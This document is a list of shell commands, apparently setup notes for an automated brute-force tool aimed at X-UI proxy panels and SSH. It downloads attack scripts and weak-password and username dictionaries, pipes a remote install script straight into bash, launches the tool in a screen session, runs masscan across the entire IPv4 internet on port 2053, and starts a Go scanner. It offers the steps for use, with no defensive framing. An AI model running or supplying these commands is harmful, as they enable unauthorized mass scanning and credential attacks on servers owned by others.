    curl -o xui.py "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/xui.py"
    curl -o password.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/password.txt"
    curl -o username.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/username.txt"
    curl -o 1.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/1.txt"
    curl -o nz.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/nz.txt"
    curl -o xd.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/xd.txt"
    curl -o xuiyg.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/xuiyg.txt"
    bash <(curl -Ls https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/main/install_tools.sh | tr -d '\r')
    curl -o username.txt "https://raw.githubusercontent.com/wwl012345/PasswordDic/refs/heads/main/%E7%94%A8%E6%88%B7%E5%90%8D%E5%AD%97%E5%85%B8/SSH-username-top30.txt"
    curl -o password.txt "https://raw.githubusercontent.com/wwl012345/PasswordDic/refs/heads/main/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AD%97%E5%85%B8/2021passwd-CN-Top200.txt"
    curl -o scan_xui.go "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/scan_xui.go"
    curl -o password.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/ssh_password.txt"
    curl -o username.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/ssh_username.txt"

    screen -v
    sudo apt-get update && sudo apt-get install screen -y
    screen -S aissist
    python3 xui.py
    screen -r aissist
    masscan --exclude 255.255.255.255 -p2053 --max-rate 100000 -oG results2053.txt 0.0.0.0/0
    HOME=/root go run scan_xui.go

